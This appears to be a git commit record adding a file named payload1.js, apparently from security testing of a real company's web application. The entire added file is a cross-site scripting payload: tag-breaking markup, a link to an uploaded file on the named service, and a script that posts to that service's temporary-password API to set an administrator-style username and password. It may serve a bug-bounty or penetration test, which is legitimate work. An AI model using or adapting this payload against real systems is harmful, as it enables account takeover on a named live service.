341ae51cfe533cc7ce6783e44d9d462e43224831
justtesting1234-source <eli@inspectiv.com>
2025-04-09 15:14:40 -0500

    Create payload1.js

---
+++ payload1.js
@@ -0,0 +1,4 @@
+<plaintext/<svg><script ''><A HREF=https://integration.servicetitan.com/Mobile/GetAttachment?name=FileUploads/temp/sample-1B2M2Y8AsgTpgAmY7PhC.html>click</A>
+
+
+<script>fetch('https://integration.servicetitan.com/app/api/auth/SetTemporaryPassword',{headers:{'Content-Type': 'application/json'},method: "POST",body: JSON.stringify({"Username":"adminadmin","Password":"passpass1234!"})})</script>
